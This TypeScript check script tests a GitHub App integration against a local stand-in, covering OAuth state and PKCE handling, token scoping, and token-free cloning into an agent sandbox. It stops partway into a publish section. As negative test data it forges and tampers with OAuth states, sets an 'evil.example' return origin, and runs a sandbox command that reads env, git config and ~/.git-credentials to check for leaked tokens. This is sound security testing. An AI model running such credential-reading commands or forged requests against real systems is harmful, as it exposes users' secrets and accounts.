/**
 * Check the App against a local HTTP stand-in and a real bare git remote.
 * WLP_CHECK_SECTIONS=connect,publish selects those sections. Pass --docker to repeat git commands in the sandbox image.
 */

import { matchesSection } from "./check-sections.js";
import assert from "node:assert/strict";
import {
	gitMirrorMount,
	MIRROR_ROOT,
	MIRROR_VOLUME,
	type MirrorStore,
	mirrorOwner,
	mirrorSavesSettled,
	mirrorSlot,
	referencedSlots,
	saveSessionMirror,
	slotsInInspect,
} from "../server/src/sandbox/git-mirrors.js";
import { sweepSessionProcesses } from "../server/src/sandbox/provider.js";
import { snapshotLimits } from "../server/src/sandbox/snapshots.js";
import { docker as dockerCli } from "../server/src/sandbox/docker.js";
import { DockerSandboxHandle, startContainer } from "../server/src/sandbox/sandboxes.js";
import { imageId } from "./check-image.js";
import { changedReviewPaths, checkoutReview, reviewCheckoutScript } from "../server/src/github/git.js";
import { type ChildProcess, execFileSync, spawn } from "node:child_process";
import { createHash, generateKeyPairSync, randomBytes } from "node:crypto";
import {
	chmodSync,
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	readdirSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { type IncomingMessage, createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ExecOptions, ExecResult, SandboxHandle } from "../server/src/sandbox/api.js";
import {
	GithubStandin,
	type StandinInstallation,
	type StandinRepository,
	gitHttpBackendAvailable,
} from "./github-standin.js";
import { Report } from "./check-report.js";

const scratch = mkdtempSync(join(tmpdir(), "wlp-github-check-"));
// Set before the server's modules are loaded: they read their configuration when they are.
process.env.WLP_SECRET = `check-secret-${randomBytes(16).toString("hex")}`;
process.env.RIVETKIT_STORAGE_PATH = join(scratch, "storage");
process.env.WLP_WEB_ORIGINS = "http://localhost:5193";
for (const name of Object.keys(process.env)) if (name.startsWith("WLP_GITHUB_")) delete process.env[name];
mkdirSync(process.env.RIVETKIT_STORAGE_PATH, { recursive: true });

const { githubConfig, githubPrivateKey, githubClientSecret } = await import("../server/src/config.js");
const { GithubApp, GithubError } = await import("../server/src/github/app.js");
const { githubCallbackResponse } = await import("../server/src/github/connect.js");
const state = await import("../server/src/github/state.js");
const repos = await import("../server/src/github/repos.js");
const publish = await import("../server/src/github/publish.js");
const naming = await import("../server/src/codehost/branch.js");
const { githubCodeHost } = await import("../server/src/codehost/github.js");
const gitSteps = await import("../server/src/github/git.js");
const { redact, pushTokenKinds } = await import("../server/src/github/redact.js");
type StoredConnection = import("../server/src/github/repos.js").StoredConnection;
type StoredRepository = import("../server/src/github/publish.js").StoredRepository;
type ConnectStore = import("../server/src/github/connect.js").ConnectStore;

const ORIGIN = "http://localhost:5193";
const DOCKER = process.argv.includes("--docker");

const output: string[] = [];
for (const method of ["log", "warn", "error"] as const) {
	const real = console[method].bind(console);
	console[method] = (...parts: unknown[]) => {
		const line = parts.map(part => (typeof part === "string" ? part : String(part))).join(" ");
		output.push(line);
		real(line.startsWith("[wlp] ") ? `      ${line}` : line);
	};
}
const tally = new Report({ failure: "dash" });
const { expect } = tally;

async function section(name: string, body: () => Promise<void>): Promise<void> {
	if (!matchesSection(name)) return;
	console.log(`\n== ${name}`);
	try {
		await body();
	} catch (error) {
		expect(`${name}: ran to its end`, false, error instanceof Error ? (error.stack ?? error.message) : String(error));
	}
}

/** What a step failed with, when it is the kind of failure a user is told. */
async function problem(step: () => Promise<unknown>): Promise<{ code: string; message: string } | null> {
	try {
		await step();
		return null;
	} catch (error) {
		if (error instanceof repos.GithubProblem) return { code: error.code, message: error.message };
		throw error;
	}
}

// ---------------------------------------------------------------------------------------------
// A sandbox's workspace on this machine
// ---------------------------------------------------------------------------------------------

interface Local extends SandboxHandle {
	home: string;
	/** Everything that was written to a command's standard input, for looking at afterwards. */
	stdins: string[];
	env: Record<string, string>;
}

function run(argv: string[], options: ExecOptions & { cwd: string; env: Record<string, string> }): Promise<ExecResult> {
	return new Promise(resolve => {
		const child = spawn(argv[0] as string, argv.slice(1), {
			cwd: options.cwd,
			env: options.env,
			stdio: ["pipe", "pipe", "pipe"],
		});
		let stdout = "";
		let stderr = "";
		let timedOut = false;
		child.stdout.on("data", (chunk: Buffer) => (stdout += chunk.toString("utf8")));
		child.stderr.on("data", (chunk: Buffer) => (stderr += chunk.toString("utf8")));
		child.stdin.on("error", () => undefined);
		child.stdin.end(options.stdin ?? "");
		const timer = setTimeout(() => {
			timedOut = true;
			child.kill("SIGKILL");
		}, options.timeoutMs ?? 60_000);
		child.on("close", code => {
			clearTimeout(timer);
			resolve({ exitCode: code, timedOut, aborted: false, stdout, stderr });
		});
	});
}

/** A directory that plays a new sandbox: a workspace with an empty repository in it, and a home of its own. */
function localSandbox(name: string): Local {
	const root = join(scratch, `sandbox-${name}-${randomBytes(3).toString("hex")}`);
	const cwd = join(root, "workspace");
	const home = join(root, "home");
	mkdirSync(cwd, { recursive: true });
	mkdirSync(home, { recursive: true });
	execFileSync("git", ["init", "--quiet", "."], { cwd });
	const env: Record<string, string> = { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: home, LANG: "C.UTF-8" };
	writeFileSync(
		join(home, ".gitconfig"),
		"[user]\n\tname = Windlass agent\n\temail = agent@windlass-platform.invalid\n[init]\n\tdefaultBranch = main\n",
	);
	const stdins: string[] = [];
	return {
		id: `local-${name}`,
		cwd,
		home,
		env,
		stdins,
		profile: "docker-hardened",
		run(command, options = {}) {
			if (options.stdin) stdins.push(options.stdin);
			return run(["bash", "-c", command], { ...options, cwd: options.cwd ?? cwd, env: { ...env, ...options.env } });
		},
		readTextFile: async path => readFileSync(path, "utf8"),
		writeTextFile: async (path, content) => writeFileSync(path, content),
	};
}

/** Every file under `directory` that holds `needle`, the git objects included. */
function filesHolding(directory: string, needle: string): string[] {
	const found: string[] = [];
	const walk = (at: string) => {
		for (const entry of readdirSync(at, { withFileTypes: true })) {
			const path = join(at, entry.name);
			if (entry.isDirectory()) walk(path);
			else if (entry.isFile() && readFileSync(path).includes(needle)) found.push(path);
		}
	};
	walk(directory);
	return found;
}

// ---------------------------------------------------------------------------------------------
// The stand-in, and the app as the server would make it
// ---------------------------------------------------------------------------------------------

if (!gitHttpBackendAvailable()) {
	console.log("FAIL  this machine's git has no git-http-backend, which the stand-in's git remote needs");
	process.exit(1);
}

const standin = new GithubStandin({ callbackUrl: "http://platform.invalid/github/callback" });
await standin.start();
const settings = {
	appId: standin.appId,
	slug: standin.slug,
	clientId: standin.clientId,
	apiUrl: standin.apiUrl,
	webUrl: standin.url,
};
const app = new GithubApp(settings, {
	clientSecret: () => standin.clientSecret,
	privateKey: () => standin.privateKeyPem,
});
/** What a pull request's description is given by these checks: a session whose work nothing verified (scripts/verified-check.ts has the section itself). */
const NOTHING_VERIFIED: import("../server/src/github/publish.js").PublishEvidence = {
	verified: null,
	during: null,
	checks: [],
	redact: (text: string) => text,
};
/** A description without the section the platform keeps at its end. */
const own = (body: string | undefined) => (body ?? "").split("<!-- windlass-platform:verified -->")[0]?.trim();

// Who is at "GitHub": ada with a repository of her own, an organization with two, and two of its members.
const ada = standin.addUser("ada");
const bo = standin.addUser("bo");
const mallory = standin.addUser("mallory");
const adaInstallation = standin.addInstallation("ada", "User");
const harbor = standin.addRepository({
	owner: "ada",
	name: "harbor",
	private: true,
	installation: adaInstallation,
	files: { "README.md": "# harbor\n", "src/add.ts": "export const add = (a: number, b: number) => a - b\n" },
});
const notes = standin.addRepository({ owner: "ada", name: "notes", private: true, installation: adaInstallation });
const acme = standin.addInstallation("acme", "Organization");
const quay = standin.addRepository({ owner: "acme", name: "quay", private: true, installation: acme });
const vault = standin.addRepository({ owner: "acme", name: "vault", private: true, installation: acme });
const open = standin.addRepository({ owner: "acme", name: "open", private: false, installation: acme });
quay.access.set("ada", "write");
quay.access.set("bo", "read");
vault.access.set("ada", "admin");
open.access.set("bo", "write");
// mallory is nobody's collaborator; her own account has an installation of its own.
const malloryInstallation = standin.addInstallation("mallory", "User");
standin.addRepository({ owner: "mallory", name: "lair", private: true, installation: malloryInstallation });

const connectionOf = (user: { id: number; login: string }, installations: StandinInstallation[]): StoredConnection => ({
	user: { id: user.id, login: user.login },
	installations: installations.map(installation => ({
		id: installation.id,
		account: installation.account,
		htmlUrl: `${standin.url}/settings/installations/${installation.id}`,
	})),
	connectedAt: Date.now(),
});
const stored = (
	repository: StandinRepository,
	installation: StandinInstallation,
	branch = repository.defaultBranch,
): StoredRepository => ({
	provider: "github",
	id: repository.id,
	owner: repository.owner,
	name: repository.name,
	branch,
	private: repository.private,
	url: `${standin.url}/${repository.owner}/${repository.name}`,
	installationId: installation.id,
});
const adaConnection = connectionOf(ada, [adaInstallation, acme]);
const boConnection = connectionOf(bo, [acme]);

/** The installation tokens asked for since `from`, as `permissions @ repositories`. */
const mintedSince = (from: number) =>
	standin.minted.slice(from).map(
		entry =>
			`${Object.entries(entry.permissions ?? {})
				.map(([name, level]) => `${name}:${level}`)
				.join(",")} @ ${entry.repositoryIds?.join(",") ?? "all"}`,
	);

// ---------------------------------------------------------------------------------------------

await section("config: the feature is off unless the GitHub App is configured", async () => {
	expect(
		"nothing set: off, and nothing is missing",
		githubConfig({}).app === null && githubConfig({}).missing.length === 0,
	);
	const partial = githubConfig({ WLP_GITHUB_APP_ID: "1", WLP_GITHUB_CLIENT_ID: "Iv23x" });
	expect(
		"some set: off, and the missing ones are named",
		partial.app === null &&
			partial.missing.join(",") === "WLP_GITHUB_APP_SLUG,WLP_GITHUB_CLIENT_SECRET,WLP_GITHUB_PRIVATE_KEY",
		partial.missing.join(", "),
	);
	const env = standin.env();
	const full = githubConfig(env);
	expect(
		"all set: on, with GitHub's addresses",
		full.app?.slug === standin.slug && full.app.apiUrl === standin.apiUrl && full.app.webUrl === standin.url,
	);
	expect(
		"the configuration object holds no secret",
		!JSON.stringify(full).includes(standin.clientSecret) && !JSON.stringify(full).includes("PRIVATE KEY"),
	);
	const defaults = githubConfig({ ...env, WLP_GITHUB_API_URL: "", WLP_GITHUB_URL: "" });
	expect(
		"GitHub's own addresses by default",
		defaults.app?.apiUrl === "https://api.github.com" && defaults.app.webUrl === "https://github.com",
	);
	const pem = standin.privateKeyPem;
	const forms = [pem, pem.trim().replace(/\n/g, "\\n"), Buffer.from(pem, "utf8").toString("base64")].map(value =>
		githubPrivateKey({ WLP_GITHUB_PRIVATE_KEY: value }),
	);
	expect(
		"the private key is read as it is, with \\n for its line breaks, and in base64",
		forms.every(value => value === forms[0] && value?.includes("-----BEGIN RSA PRIVATE KEY-----\n")),
	);
	expect(
		"the client secret is read where it is used",
		githubClientSecret(env) === standin.clientSecret && githubClientSecret({}) === null,
	);
	let said = "";
	try {
		githubConfig({ ...env, WLP_GITHUB_APP_ID: "not-a-number-s3cret" });
	} catch (error) {
		said = error instanceof Error ? error.message : "";
	}
	expect(
		"a setting that cannot be right is named, and its value is not repeated",
		said.includes("WLP_GITHUB_APP_ID") && !said.includes("s3cret"),
		said,
	);
	const broken = new GithubApp(settings, {
		clientSecret: () => "x",
		privateKey: () => "-----BEGIN RSA PRIVATE KEY-----\nbm90IGEga2V5\n-----END RSA PRIVATE KEY-----\n",
	});
	expect(
		"a key that is no key is said so, without the key",
		(broken.keyProblem() ?? "").includes("WLP_GITHUB_PRIVATE_KEY") && !(broken.keyProblem() ?? "").includes("bm90"),
		broken.keyProblem() ?? "",
	);
});

await section("jwt: the app's own token", async () => {
	const now = Date.now();
	const [header, claims] = app
		.jwt(now)
		.split(".")
		.slice(0, 2)
		.map(part => JSON.parse(Buffer.from(part, "base64url").toString("utf8")) as Record<string, unknown>);
	const seconds = Math.floor(now / 1000);
	expect("RS256, issued by the app's id", header?.alg === "RS256" && claims?.iss === standin.appId);
	expect(
		"issued a minute back and good for nine more: inside GitHub's ten",
		claims?.iat === seconds - 60 && claims?.exp === seconds + 540,
	);
	const issued = await app.installationToken(adaInstallation.id, {
		repositoryId: harbor.id,
		permissions: { metadata: "read" },
	});
	expect(
		"the stand-in verifies it against the app's public key and issues a token",
		standin.alive(issued.token) && issued.expiresAt > now && issued.expiresAt <= now + 3600_000 + 5_000,
	);
	const otherKey = generateKeyPairSync("rsa", { modulusLength: 2048 })
		.privateKey.export({ type: "pkcs1", format: "pem" })
		.toString();
	const stranger = new GithubApp(settings, { clientSecret: () => "x", privateKey: () => otherKey });
	const refused = await stranger.installationToken(adaInstallation.id, { permissions: { metadata: "read" } }).then(
		() => null,
		(error: unknown) => error,
	);
	expect(
		"a token signed with another key gets nothing",
		refused instanceof GithubError && refused.status === 401,
		refused instanceof Error ? refused.message : "",
	);
	expect("revoking: the token stops working at once", (await app.revoke(issued)) && !standin.alive(issued.token));
});

// ---------------------------------------------------------------------------------------------
// Connecting
// ---------------------------------------------------------------------------------------------

/** The `user` actor's part in connecting: the states that were issued and not claimed yet. */
class MemoryStore implements ConnectStore {
	readonly pending = new Map<string, { uid: string; verifier: string | null; expiresAt: number }>();

	/** What `user.githubConnect` does: a state for the user, and the address at GitHub to go to. */
	begin(uid: string, origin = ORIGIN): { url: string; state: string } {
		const nonce = state.newNonce();
		const { verifier, challenge } = state.newCodeVerifier();
		this.pending.set(nonce, { uid, verifier, expiresAt: Date.now() + state.STATE_TTL_MS });
		const issued = state.issueState(uid, nonce, origin);
		return { url: app.authorizeUrl(issued, challenge), state: issued };
	}

	async claim(uid: string, nonce: string): Promise<{ ok: boolean; verifier: string | null }> {
		const entry = this.pending.get(nonce);
		this.pending.delete(nonce);
		return entry && entry.uid === uid && entry.expiresAt > Date.now()
			? { ok: true, verifier: entry.verifier }
			: { ok: false, verifier: null };
	}

	async next(uid: string, origin: string): Promise<string> {
		const nonce = state.newNonce();
		this.pending.set(nonce, { uid, verifier: null, expiresAt: Date.now() + state.STATE_TTL_MS });
		return state.issueState(uid, nonce, origin);
	}
}

const store = new MemoryStore();
const visit = async (
	address: string,
): Promise<{
	status: number;
	location: string;
	ticket: ReturnType<typeof state.verifyTicket>;
	error: string | null;
}> => {
	const response = await githubCallbackResponse(new Request(address), {
		app,
		store,
		origins: [ORIGIN],
		log: line => console.log(line),
	});
	const location = response.headers.get("location") ?? "";
	const fragment = location.includes("#") ? location.slice(location.indexOf("#") + 1) : "";
	return {
		status: response.status,
		location,
		ticket: fragment.startsWith("github=") ? state.verifyTicket(fragment.slice("github=".length)) : null,
		error: fragment.startsWith("github-error=") ? fragment.slice("github-error=".length) : null,
	};
};

await section("connect: login callback registration", async () => {
	const request = new Request(ORIGIN + "/github/callback?error=redirect_uri_mismatch&state=platform-state");
	const reply = await githubCallbackResponse(request, { app, store, origins: [ORIGIN] });
	expect(
		"a login returned to the default App callback names the missing URL",
		reply.status === 400 &&
			(await reply.text()).includes("Add " + ORIGIN + "/signin to the GitHub App's callback URLs"),
	);
});

await section("connect: a user with an installation", async () => {
	const begun = store.begin("u_ada");
	const address = new URL(begun.url);
	expect(
		"the browser is sent to GitHub's authorization page with the client id, the state and a PKCE challenge",
		begun.url.startsWith(`${standin.url}/login/oauth/authorize?`) &&
			address.searchParams.get("client_id") === standin.clientId &&
			address.searchParams.get("code_challenge_method") === "S256" &&
			(address.searchParams.get("code_challenge") ?? "").length === 43,
	);
	const before = standin.requests.length;
	const back = await visit(standin.authorize("ada", begun.url));
	expect(
		"back from GitHub: sent on to the web app with a ticket in the fragment",
		back.status === 302 && back.location.startsWith(`${ORIGIN}/#github=`) && back.ticket !== null,
		back.location.slice(0, 60),
	);
	expect(
		"the ticket is for the user the state was signed for",
		back.ticket?.uid === "u_ada" && back.ticket.user.login === "ada" && back.ticket.user.id === ada.id,
	);
	expect(
		"it names the installations GitHub lists for this GitHub user, and no other",
		back.ticket?.installations
			.map(installation => installation.account.login)
			.sort()
			.join(",") === "acme,ada",
		back.ticket?.installations
			.map(installation => `${installation.account.login} (${installation.account.type})`)
			.join(", "),
	);
	const calls = standin.requests
		.slice(before)
		.map(request => `${request.method} ${request.path.split("?")[0]} as ${request.auth}`);
	expect(
		"connect exchanges the code, reads identity and installations, and revokes the token",
		calls[0] === "POST /login/oauth/access_token as none" &&
			calls.includes("GET /api/v3/user as user") &&
			calls.includes("GET /api/v3/user/installations as user") &&
			calls[3] === `DELETE /api/v3/applications/${standin.clientId}/token as basic` &&
			calls.length === 4,
	);
	expect(
		"the ticket carries only connection metadata",
		Object.keys(back.ticket ?? {})
			.sort()
			.join(",") === "exp,installations,k,nonce,readAt,uid,user",
	);
	const userTokens = [...standin.tokens.values()].filter(token => token.kind === "user");
	expect(
		"no user access token is left alive: the platform keeps no credential of the user's",
		userTokens.length > 0 && userTokens.every(token => !standin.alive(token.value)),
	);
	const forged = state.verifyTicket(`${back.location.slice(back.location.indexOf("=") + 1, -4)}AAAA`);
	expect("a ticket that was changed is no ticket", forged === null);
});

await section("connect: a state works once, for the user it was signed for, and for a while", async () => {
	const begun = store.begin("u_ada");
	const address = standin.authorize("ada", begun.url);
	const first = await visit(address);
	const again = await visit(address);
	expect(
		"the same address a second time is refused",
		first.ticket !== null && again.error === "used" && again.ticket === null,
		`${again.location}`,
	);
	const replay = await visit(standin.authorize("ada", begun.url));
	expect("the same state with a new code is refused too", replay.error === "used");

	const fresh = store.begin("u_ada");
	const parts = fresh.state.split(".");
	const tampered = `${parts[0]}.${parts[1]}.${Buffer.from(JSON.stringify({ ...JSON.parse(Buffer.from(parts[2] as string, "base64url").toString("utf8")), uid: "u_mallory" }), "utf8").toString("base64url")}.${parts[3]}`;
	const forged = await visit(
		standin.authorize("mallory", begun.url).replace(encodeURIComponent(begun.state), encodeURIComponent(tampered)),
	);
	expect(
		"a state whose user was changed is refused",
		forged.error === "state" && forged.ticket === null,
		forged.location,
	);
	expect(
		"and it did not use up the real one",
		store.pending.size > 0 && (await visit(standin.authorize("ada", fresh.url))).ticket !== null,
	);

	const madeUp = `gh1.${Buffer.from(JSON.stringify({ k: "state", uid: "u_ada", nonce: "n", origin: ORIGIN, exp: Date.now() + 60_000 }), "utf8").toString("base64url")}.${randomBytes(32).toString("base64url")}`;
	expect(
		"a state nobody signed is refused",
		(await visit(`http://platform.invalid/github/callback?code=x&state=${encodeURIComponent(madeUp)}`)).error ===
			"state",
	);
	expect(
		"no state at all is refused",
		(await visit("http://platform.invalid/github/callback?code=x")).error === "state",
	);

	const nonce = state.newNonce();
	store.pending.set(nonce, { uid: "u_ada", verifier: null, expiresAt: Date.now() + 60_000 });
	const old = state.issueState("u_ada", nonce, ORIGIN, Date.now() - state.STATE_TTL_MS - 1_000);
	expect(
		"a state past its ten minutes is refused",
		(await visit(`http://platform.invalid/github/callback?code=x&state=${encodeURIComponent(old)}`)).error === "state",
	);

	const elsewhere = state.issueState("u_ada", state.newNonce(), "https://evil.example");
	const strayed = await visit(`http://platform.invalid/github/callback?code=x&state=${encodeURIComponent(elsewhere)}`);
	expect(
		"a state that names another site to go back to is refused, and nobody is sent there",
		strayed.error === "state" && strayed.location.startsWith(ORIGIN),
		strayed.location,
	);

	const other = store.begin("u_ada");
	const wrongCode = new URL(standin.authorize("ada", other.url));
	wrongCode.searchParams.set("code", "0000000000");
	expect("a code GitHub does not know is refused", (await visit(wrongCode.toString())).error === "code");

	// The code of one authorization with the state of another: the PKCE verifier does not fit.
	const one = store.begin("u_ada");
	const two = store.begin("u_ada");
	const mixed = new URL(standin.authorize("ada", one.url));
	mixed.searchParams.set("state", two.state);
	expect(
		"a code that was issued for another state's challenge is refused",
		(await visit(mixed.toString())).error === "code",
	);

	const declined = store.begin("u_ada");
	expect(
		"a user who declines at GitHub is told so",
		(await visit(standin.authorize("ada", declined.url, { deny: true }))).error === "denied",
	);
});

await section("connect: an installation that is not the user's cannot be attached", async () => {
	// mallory authorizes as herself and names ada's installation in the address, as anyone can.
	const begun = store.begin("u_mallory");
	const guessed = await visit(standin.installed("mallory", adaInstallation.id, begun.state));
	expect(
		"naming another account's installation is refused",
		guessed.error === "not_yours" && guessed.ticket === null,
		guessed.location,
	);
	const bare = store.begin("u_mallory");
	const noCode = await visit(
		`http://platform.invalid/github/callback?installation_id=${adaInstallation.id}&setup_action=install&state=${encodeURIComponent(bare.state)}`,
	);
	expect("an installation id with no code is refused", noCode.error === "code" && noCode.ticket === null);
	const own = store.begin("u_mallory");
	const honest = await visit(standin.authorize("mallory", own.url));
	expect(
		"what she gets is her own installation only",
		honest.ticket?.installations.length === 1 && honest.ticket.installations[0]?.account.login === "mallory",
	);
	// bo is a member of acme with access to some of its repositories: GitHub lists acme's installation for him.
	const member = await visit(standin.authorize("bo", store.begin("u_bo").url));
	expect(
		"a member of an organization reaches the organization's installation",
		member.ticket?.installations.map(installation => installation.account.login).join(",") === "acme",
	);
});

await section("connect: nothing installed yet", async () => {
	const newcomer = standin.addUser("cy");
	const begun = store.begin("u_cy");
	const first = await visit(standin.authorize("cy", begun.url));
	expect(
		"the browser goes on to the app's installation page, with a new state",
		first.status === 302 &&
			first.location.startsWith(`${standin.url}/apps/${standin.slug}/installations/new?state=`) &&
			!first.location.includes(encodeURIComponent(begun.state)),
		first.location.slice(0, 80),
	);
	const fresh = standin.addRepository({ owner: "cy", name: "skiff", private: true });
	const second = await visit(standin.install("cy", first.location, "cy", "User", [fresh]));
	expect(
		"after the installation the ticket names it",
		second.ticket?.uid === "u_cy" &&
			second.ticket.user.id === newcomer.id &&
			second.ticket.installations.length === 1 &&
			second.ticket.installations[0]?.account.login === "cy",
	);
	const waiting = standin.addUser("dee");
	const third = await visit(standin.authorize("dee", store.begin("u_dee").url));
	const requested = new URL("http://platform.invalid/github/callback");
	requested.searchParams.set("setup_action", "request");
	requested.searchParams.set("state", new URL(third.location).searchParams.get("state") ?? "");
	expect(
		"a request to install that waits on an owner is said to be waiting",
		(await visit(requested.toString())).error === "pending",
		`dee is ${waiting.login}`,
	);
	standin.down = true;
	const unreachable = await visit(standin.authorize("ada", store.begin("u_ada").url).replace("code=", "code="));
	standin.down = false;
	expect(
		"GitHub cannot be reached: said so, and nothing is recorded",
		unreachable.error === "unreachable" || unreachable.error === "code",
		unreachable.error ?? "",
	);
});

// ---------------------------------------------------------------------------------------------
// Repositories
// ---------------------------------------------------------------------------------------------

await section("repositories: what a connected user may see and do", async () => {
	repos.forgetGithubCaches();
	const from = standin.minted.length;
	const all = await repos.listRepositories(app, adaConnection, "");
	expect(
		"ada sees her own repositories and the organization's she can read",
		all.repositories
			.map(repository => `${repository.owner}/${repository.name}`)
			.sort()
			.join(",") === "acme/quay,acme/vault,ada/harbor,ada/notes",
		all.repositories.map(repository => `${repository.owner}/${repository.name}`).join(", "),
	);
	expect(
		"the tokens it took were for metadata only",
		mintedSince(from).every(entry => entry.startsWith("metadata:read @")),
		mintedSince(from).join("; "),
	);
	const found = await repos.listRepositories(app, adaConnection, "HARB");
	expect(
		"a search matches part of owner/name, whatever its case",
		found.repositories.length === 1 &&
			found.repositories[0]?.name === "harbor" &&
			found.repositories[0].private &&
			found.repositories[0].defaultBranch === "main",
	);
	repos.forgetGithubCaches();
	const member = await repos.listRepositories(app, boConnection, "");
	expect(
		"bo, a member of the organization, sees the two he was given and not the third",
		member.repositories
			.map(repository => repository.name)
			.sort()
			.join(",") === "open,quay",
		member.repositories.map(repository => repository.name).join(", "),
	);
	expect(
		"and is told where he can only read",
		member.repositories.find(repository => repository.name === "quay")?.canPush === false &&
			member.repositories.find(repository => repository.name === "open")?.canPush === true,
	);
	const hidden = await problem(() => repos.resolveRepository(app, boConnection, vault.id, "read"));
	expect(
		"a repository of the installation he cannot open is refused by name",
		hidden?.code === "github_denied" && hidden.message.includes("no access to acme/vault"),
		hidden?.message,
	);
	const foreign = await problem(() => repos.resolveRepository(app, boConnection, harbor.id, "read"));
	expect(
		"a repository of an installation that is not his is not found at all",
		foreign?.code === "github_gone",
		foreign?.message,
	);
	const branches = await repos.listBranches(app, adaConnection, harbor.id);
	standin.commit(harbor, "release", { VERSION: "1\n" }, "Cut a release", "main");
	repos.forgetGithubCaches();
	const more = await repos.listBranches(app, adaConnection, harbor.id);
	expect(
		"branches are listed, the default first",
		branches.branches.join(",") === "main" &&
			more.branches.join(",") === "main,release" &&
			more.defaultBranch === "main",
	);
});

// ---------------------------------------------------------------------------------------------
// Tokens
// ---------------------------------------------------------------------------------------------

await section("tokens: one repository, the permissions of one step, and no use elsewhere", async () => {
	const read = await app.installationToken(adaInstallation.id, {
		repositoryId: harbor.id,
		permissions: { metadata: "read", contents: "read" },
	});
	const asked = standin.minted.at(-1);
	expect(
		"GitHub is asked for exactly that repository and those permissions",
		asked?.repositoryIds?.join(",") === String(harbor.id) &&
			JSON.stringify(asked?.permissions) === JSON.stringify({ metadata: "read", contents: "read" }),
	);
	const elsewhere = await app.repository(read.token, "ada", "notes").then(
		() => null,
		(error: unknown) => error,
	);
	expect(
		"the token does not see the installation's other repository",
		elsewhere instanceof GithubError && elsewhere.status === 404,
	);
	const listed = await app.installationRepositories(read.token);
	expect(
		"and lists no repository but its own",
		listed.repositories.map(repository => repository.name).join(",") === "harbor",
	);
	const pulls = await app
		.createPull(read.token, "ada", "harbor", { title: "x", body: "", head: "release", base: "main" })
		.then(
			() => null,
			(error: unknown) => error,
		);
	expect(
		"it cannot open a pull request: that permission was not asked for",
		pulls instanceof GithubError && pulls.status === 403,
	);
	const sandbox = localSandbox("scope");
	const other = await gitSteps.cloneWithToken(sandbox, read.token, {
		url: app.cloneUrl("ada", "notes"),
		branch: "main",
		directory: "notes",
	});
	expect("git cannot clone another repository with it", !other.ok && other.failure === "gone", other.said);
	const outside = await app
		.installationToken(adaInstallation.id, { repositoryId: quay.id, permissions: { metadata: "read" } })
		.then(
			() => null,
			(error: unknown) => error,
		);
	expect(
		"an installation is given no token for a repository it does not cover",
		outside instanceof GithubError && outside.status === 422,
	);
	await app.revoke(read);
});

// ---------------------------------------------------------------------------------------------
// Cloning
// ---------------------------------------------------------------------------------------------

/** Takes the tokens that were issued since `from` out of the stand-in's record, to look for them. */
const tokensSince = (from: number) => standin.minted.slice(from).map(entry => entry.token);

await section("clone: a private repository, and nothing of the token left behind", async () => {
	const sandbox = localSandbox("clone");
	const from = standin.minted.length;
	const done = await publish.cloneRepository(app, adaConnection, stored(harbor, adaInstallation), sandbox);
	const tokens = tokensSince(from);
	const used = tokens.at(-1) ?? "";
	expect("the clone succeeds", done && readFileSync(join(sandbox.cwd, "src/add.ts"), "utf8").includes("a - b"));
	expect(
		"the token it used was for reading this one repository",
		mintedSince(from).at(-1) === `metadata:read,contents:read @ ${harbor.id}`,
		mintedSince(from).join("; "),
	);
	expect(
		"the token reached the command on its standard input, and only there",
		sandbox.stdins.some(stdin => stdin === `${used}\n`),
	);
	const config = readFileSync(join(sandbox.cwd, ".git/config"), "utf8");
	expect(
		"the repository's configuration has the plain address and no credential",
		config.includes(`url = ${standin.url}/ada/harbor.git`) &&
			!config.includes(used) &&
			!/x-access-token|extraheader|helper/i.test(config),
		config.replace(/\s+/g, " "),
	);
	expect(
		"no file in the workspace or the home directory holds the token",
		tokens.every(
			token => filesHolding(sandbox.cwd, token).length === 0 && filesHolding(sandbox.home, token).length === 0,
		),
	);
	const later = await sandbox.run(
		"env; git config --list --show-origin; ls /tmp; cat ~/.git-credentials 2>/dev/null || true",
	);
	expect(
		"a command that runs afterwards finds it in no variable, no configuration and no leftover",
		tokens.every(token => !later.stdout.includes(token)) && !/wlp-(push|publish|message)/.test(later.stdout),
	);
	expect(
		"the token was revoked when the clone had ended",
		tokens.length > 0 && tokens.every(token => !standin.alive(token)),
	);
	const fetch = await sandbox.run("GIT_TERMINAL_PROMPT=0 git fetch origin 2>&1; echo exit=$?");
	expect(
		"the agent's own git has nothing to reach the private repository with",
		/exit=(?!0)/.test(fetch.stdout),
		fetch.stdout.trim().split("\n").slice(-2).join(" "),
	);

	const branch = localSandbox("branch");
	await publish.cloneRepository(app, adaConnection, stored(harbor, adaInstallation, "release"), branch);
	const head = await branch.run("git symbolic-ref --short HEAD; ls");
	expect(
		"another branch can be the one to start from",
		head.stdout.startsWith("release\n") && head.stdout.includes("VERSION"),
	);
	const missing = await problem(() =>
		publish.cloneRepository(app, adaConnection, stored(harbor, adaInstallation, "nowhere"), localSandbox("nobranch")),
	);
	expect(
		"a branch that does not exist is said so",
		missing?.message === "ada/harbor has no branch nowhere any more.",
		missing?.message,
	);

	const anonymous = localSandbox("public");
	const pasted = await anonymous.run(
		`rm -rf .git && GIT_TERMINAL_PROMPT=0 git clone --quiet -- ${standin.url}/acme/open.git . && ls`,
	);
	expect(
		"a public repository's pasted address is cloned with no token at all, as before",
		pasted.exitCode === 0 && pasted.stdout.includes("README.md"),
	);
	const priv = await anonymous.run(
		`GIT_TERMINAL_PROMPT=0 git clone --quiet -- ${standin.url}/ada/notes.git x 2>&1; echo exit=$?`,
	);
	expect("and a private one is not", /exit=(?!0)/.test(priv.stdout));

	const stranger = await problem(() =>
		publish.cloneRepository(app, boConnection, stored(vault, acme), localSandbox("stranger")),
	);
	expect(
		"a member cannot have a repository cloned that GitHub does not let them read",
		stranger?.code === "github_denied",
		stranger?.message,
	);
	const gone = await problem(() =>
		publish.cloneRepository(app, null, stored(harbor, adaInstallation), localSandbox("gone")),
	);
	expect(
		"without a connection nothing is cloned",
		gone?.code === "github_gone" && gone.message === repos.NOT_CONNECTED,
		gone?.message,
	);
});

// ---------------------------------------------------------------------------------------------
// The pull request
// ---------------------------------------------------------------------------------------------

const BRANCH = naming.branchFor("Fix the failing add test…", "s_0123456789abcdef");

await section("publish: a pull request is opened, then the same branch is updated", async () => {
	expect(
		"the branch is named for the session",
		BRANCH === "windlass/fix-the-failing-add-test-abcdef" &&
			naming.branchFor("  ", "s_ffff000011112222") === "windlass/agent-112222",
		BRANCH,
	);
